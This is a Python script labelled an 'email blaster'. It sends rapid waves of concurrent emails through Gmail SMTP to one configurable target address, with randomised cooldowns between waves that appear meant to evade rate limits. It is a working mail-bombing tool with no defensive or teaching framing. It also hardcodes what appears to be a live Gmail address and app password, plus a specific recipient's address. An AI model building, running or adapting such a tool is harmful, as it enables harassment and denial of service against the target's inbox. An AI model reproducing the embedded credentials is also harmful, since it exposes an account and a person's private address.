#!/data/data/com.termux/files/usr/bin/python3
import smtplib
import time
import random
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ========== CONFIG ==========
YOUR_EMAIL = "tskforcests@gmail.com"
APP_PASSWORD = "zbdh eovg eosl ittv"
TARGET_EMAIL = "sany.kosch@gmx.de"  # CHANGE THIS

SUBJECT = "sg nil"
MESSAGE = "info #1 test #3"

TOTAL_LIMIT = 100
WAVE_SIZE = 50                      # 50 emails per wave
DELAY_BETWEEN_EMAILS = 0.0005      # 0.5ms between starts
DELAY_BETWEEN_WAVES_MIN = 120      # 2 minutes minimum
DELAY_BETWEEN_WAVES_MAX = 180      # 3 minutes maximum
MAX_WORKERS = 20                    # Concurrent sends
# ============================

LOG_FILE = "logs.txt"
WAVE_LOG_FILE = "wave_logs.txt"

def log(msg, file=LOG_FILE):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    log_entry = f"[{timestamp}] {msg}"
    
    with open(file, "a") as f:
        f.write(log_entry + "\n")
    
    print(log_entry)
    return log_entry

def send_single(email_num, wave_num):
    """Send one email"""
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
        server.starttls()
        server.login(YOUR_EMAIL, APP_PASSWORD)
        
        msg = f"Subject: {SUBJECT} Wave{wave_num}#{email_num}\n\n{MESSAGE}"
        server.sendmail(YOUR_EMAIL, TARGET_EMAIL, msg)
        server.quit()
        
        return True, email_num
    except Exception as e:
        return False, f"{email_num} Error: {str(e)[:30]}"

def execute_wave(wave_num, emails_to_send):
    """Execute one wave of rapid-fire emails"""
    wave_start = datetime.now()
    print(f"\n{'='*60}")
    print(f"🌊 WAVE #{wave_num} LAUNCHING - {emails_to_send} emails")
    print(f"{'='*60}")
    
    log(f"WAVE #{wave_num} START - {emails_to_send} emails", WAVE_LOG_FILE)
    
    results = []
    start_num = (wave_num - 1) * WAVE_SIZE + 1
    
    # Use threading for concurrent sending
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        
        for i in range(emails_to_send):
            email_num = start_num + i
            
            # Submit to thread pool
            future = executor.submit(send_single, email_num, wave_num)
            futures.append(future)
            
            # Tiny delay between starting threads (0.5ms)
            if i < emails_to_send - 1:
                time.sleep(DELAY_BETWEEN_EMAILS)
        
        # Collect results
        for future in as_completed(futures):
            success, result = future.result()
            results.append(success)
            
            if success:
                print(f"  ✓ #{result}", end=" ", flush=True)
            else:
                print(f"  ✗ {result}", end=" ", flush=True)
    
    # Wave statistics
    wave_end = datetime.now()
    wave_duration = (wave_end - wave_start).total_seconds()
    successful = sum(results)
    failed = len(results) - successful
    
    print(f"\n\n📊 WAVE #{wave_num} COMPLETE")
    print(f"   Duration: {wave_duration:.2f}s")
    print(f"   Successful: {successful}/{emails_to_send}")
    print(f"   Failed: {failed}")
    print(f"   Rate: {emails_to_send/wave_duration:.1f} emails/sec")
    
    # Log wave summary
    wave_log = f"WAVE #{wave_num}: {emails_to_send} sent in {wave_duration:.2f}s - {successful} successful"
    log(wave_log, WAVE_LOG_FILE)
    
    return successful, wave_duration

def main():
    print("\n" + "="*60)
    print("🌊 RAPID WAVE EMAIL BLASTER")
    print("="*60)
    print(f"From: {YOUR_EMAIL}")
    print(f"Target: {TARGET_EMAIL}")
    print(f"Total limit: {TOTAL_LIMIT} emails")
    print(f"Wave size: {WAVE_SIZE} emails")
    print(f"Delay between emails: {DELAY_BETWEEN_EMAILS*1000:.1f}ms")
    print(f"Cooldown between waves: {DELAY_BETWEEN_WAVES_MIN//60}-{DELAY_BETWEEN_WAVES_MAX//60} mins")
    print("="*60)
    print("\nStarting in 5 seconds...")
    time.sleep(5)
    
    total_sent = 0
    total_successful = 0
    wave_count = 0
    
    campaign_start = datetime.now()
    log(f"CAMPAIGN START - Target: {TARGET_EMAIL}, Limit: {TOTAL_LIMIT}")
    
    while total_sent < TOTAL_LIMIT:
        wave_count += 1
        emails_in_wave = min(WAVE_SIZE, TOTAL_LIMIT - total_sent)
        
        # Execute wave
        successful, wave_time = execute_wave(wave_count, emails_in_wave)
        
        total_sent += emails_in_wave
        total_successful += successful
        
        # Check if done
        if total_sent >= TOTAL_LIMIT:
            break
        
        # Cooldown between waves (2-3 minutes)
        cooldown = random.randint(DELAY_BETWEEN_WAVES_MIN, DELAY_BETWEEN_WAVES_MAX)
        minutes = cooldown // 60
        seconds = cooldown % 60
        
        print(f"\n⏳ COOLDOWN: {minutes}m {seconds}s before next wave...")
        log(f"Cooldown: {minutes}m {seconds}s before Wave #{wave_count+1}", WAVE_LOG_FILE)
        
        # Visual countdown
        remaining = cooldown
        while remaining > 0:
            if remaining % 30 == 0 or remaining <= 10:
                mins = remaining // 60
                secs = remaining % 60
                print(f"  {mins:02d}:{secs:02d} remaining", end="\r")
            time.sleep(1)
            remaining -= 1
        
        print(" " * 30, end="\r")  # Clear line
        print("✅ Cooldown complete!")
    
    # Campaign summary
    campaign_end = datetime.now()
    total_duration = (campaign_end - campaign_start).total_seconds()
    
    print(f"\n{'='*60}")
    print("🎯 CAMPAIGN COMPLETE")
    print(f"{'='*60}")
    print(f"Waves executed: {wave_count}")
    print(f"Total emails sent: {total_sent}")
    print(f"Total successful: {total_successful}")
    print(f"Total failed: {total_sent - total_successful}")
    print(f"Total time: {total_duration:.1f}s ({total_duration/60:.1f} minutes)")
    print(f"Average rate: {total_sent/total_duration:.1f} emails/sec")
    print(f"Success rate: {(total_successful/total_sent)*100:.1f}%")
    print(f"{'='*60}")
    
    # Final log entry
    final_log = f"CAMPAIGN END: {total_sent} total, {total_successful} successful, {wave_count} waves, {total_duration:.1f}s"
    log(final_log)
    
    print(f"\n📁 Main log: {LOG_FILE}")
    print(f"📁 Wave log: {WAVE_LOG_FILE}")

if __name__ == "__main__":
    main()
